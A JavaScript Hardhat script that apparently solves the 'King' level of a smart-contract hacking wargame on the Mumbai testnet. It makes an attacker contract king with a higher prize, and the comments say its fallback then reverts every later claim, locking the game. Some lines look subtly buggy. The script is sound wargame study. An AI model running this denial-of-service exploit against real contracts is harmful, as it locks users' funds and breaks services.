require("dotenv").config()
const {
  abi: ABIAttackKing,
} = require("../../artifacts/contracts/9/King.sol/AttackKing.json")
const {
  abi: ABIKing,
} = require("../../artifacts/contracts/9/King.sol/King.json")
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* DEPLOY + ATTACK */
async function main() {
  /* CONTRACT NAME */
  const contractAddressToHack = "0xa363316cb597E9FC0A9DbD26d201E888fc82F06e"

  /* delegation instance */
  const KingContract = new ethers.Contract(
    contractAddressToHack,
    ABIKing,
    provider
  )
  /* delegation instance */
  const AttackKingContract = new ethers.Contract(
    contractAddressToHack,
    ABIAttackKing,
    provider
  )

  /* set bigger prize */
  const price = await KingContract.prize()
  const newPrize = Number(price + 100).toString(10)
  console.log("newPrize", newPrize)

  /* become king - break contrat (always will revert when someone tries to become new king -> case, current king fallback will revert tx) */
  const tx = await AttackKingContract.connect(signer).setKingAttack({
    value: newPrize,
  })

  const res = await tx.wait()
  if (res.status === 0) {
    console.log("Transaction failed")

    // Retrieve the revert reason from the res if available
    if (res.logs && res.logs.length > 0) {
      const errorLog = res.logs.find((log) => log.topics[0] === "0x08c379a0") // Keccak hash of "Error(string)"
      if (errorLog) {
        const errorData = errorLog.data
        const reason = ethers.utils.toUtf8String(errorData.slice(4)) // Removing the 4-byte selector
        console.log("Revert reason:", reason)
      }
    }
  } else if (res.status === 1) {
    console.log("Transaction succeeded")
  }
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/9/DeployAndCall__Attack.js --network mumbai
*/
